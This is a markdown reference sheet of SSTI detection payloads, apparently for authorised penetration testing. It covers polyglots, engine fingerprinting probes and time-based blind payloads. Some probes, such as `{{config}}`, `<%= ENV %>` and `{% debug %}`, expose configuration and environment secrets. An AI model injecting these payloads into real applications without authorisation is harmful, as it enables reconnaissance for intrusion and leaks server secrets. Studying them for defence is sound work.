# SSTI Detection Table

Polyglot reference for template engine detection and identification.

Based on [Hackmanit Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/) research.

---

## Universal Detection Polyglots

### Error-Based (Primary)

```
<%'${{/#{@}}%>{{
```

Triggers syntax error in all major template engines. Check response for:
- Engine name in error → Identified
- Generic error → Template processing confirmed
- Unchanged → Not in template context

### Non-Error Based

Use when errors are suppressed. At least ONE will render modified:

| Polyglot | Length |
|----------|--------|
| `p">[[${{1}}]]` | 14 |
| `<%=1%>@*#{1}` | 12 |
| `{##}/*{{.}}*/` | 13 |

---

## Engine Differentiation

### Primary Test

```
{{7*'7'}}
```

| Response | Engine |
|----------|--------|
| `7777777` | Jinja2, Mako |
| `49` | Twig, Nunjucks, Pebble |
| Empty/error | Django, Handlebars |

### Syntax Family Identification

| Test | Response | Engines |
|------|----------|---------|
| `{{7*7}}` → `49` | Mustache-family | Jinja2, Twig, Nunjucks |
| `${7*7}` → `49` | Dollar-brace | FreeMarker, Thymeleaf |
| `<%= 7*7 %>` → `49` | ERB-style | ERB, EJS |
| `{$smarty.version}` → version | Smarty-style | Smarty |
| `#set($x=7*7)$x` → `49` | Velocity-style | Velocity |
| `{{7\|add:7}}` → `14` | Django filters | Django |

---

## Engine-Specific Confirmation

Minimum 2-3 tests should pass.

### Jinja2

| Test | Expected |
|------|----------|
| `{{7*7}}` | `49` |
| `{{7*'7'}}` | `7777777` |
| `{{config}}` | Config object |

### Twig

| Test | Expected |
|------|----------|
| `{{7*7}}` | `49` |
| `{{7*'7'}}` | `49` |
| `{{_self}}` | Object reference |

### FreeMarker

| Test | Expected |
|------|----------|
| `${7*7}` | `49` |
| `${.version}` | Version string |
| `<#assign x=1>${x}` | `1` |

### Velocity

| Test | Expected |
|------|----------|
| `#set($x=7*7)$x` | `49` |
| `$class` | ClassTool |
| `${7*7}` | `49` (if enabled) |

### Smarty

| Test | Expected |
|------|----------|
| `{$smarty.version}` | Version |
| `{math equation="7*7"}` | `49` |
| `{$smarty.now}` | Timestamp |

### ERB

| Test | Expected |
|------|----------|
| `<%= 7*7 %>` | `49` |
| `<%= self.class %>` | Class name |
| `<%= ENV %>` | Hash |

### Django

| Test | Expected | Notes |
|------|----------|-------|
| `{{7*7}}` | Empty or `7*7` | Math NOT evaluated |
| `{{7\|add:7}}` | `14` | Filter syntax |
| `{% debug %}` | Context dump | If DEBUG=True |
| `{{request}}` | Request object | If in context |

**Key Django identifier:** `{{7*7}}` does NOT return `49`, but `{{7|add:7}}` returns `14`.

### Pug/Jade

| Test | Expected |
|------|----------|
| `#{7*7}` | `49` |
| `= 7*7` | `49` |
| `= global` | Object |

---

## Shortened Polyglots

For length-constrained inputs:

| Length | Polyglot | Targets |
|--------|----------|---------|
| 8 | `{{7*7}}` | Jinja2, Twig |
| 7 | `${7*7}` | FreeMarker |
| 6 | `<%=1%>` | ERB |
| 5 | `{7*7}` | Smarty |
| 10 | `{{7\|add:7}}` | Django |

---

## Error Message Patterns

| Error Contains | Engine |
|----------------|--------|
| `jinja2` | Jinja2 |
| `Twig` | Twig |
| `FreeMarker` | FreeMarker |
| `Velocity` | Velocity |
| `Smarty` | Smarty |
| `ERB` | ERB |
| `Pug` / `Jade` | Pug |
| `Django` | Django |
| `Nunjucks` | Nunjucks |
| `Thymeleaf` | Thymeleaf |

---

## Blind Detection Delays

For time-based confirmation when no reflection:

| Engine | Delay Payload |
|--------|---------------|
| Jinja2 | `{{range(999999)\|list}}` |
| Twig | `{{sleep(5)}}` |
| FreeMarker | `${sleep(5000)}` |
| Velocity | `#set($x=$thread.sleep(5000))` |
| ERB | `<%= sleep(5) %>` |

---

## External Resources

- [Hackmanit Interactive Table](https://cheatsheet.hackmanit.de/template-injection-table/)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
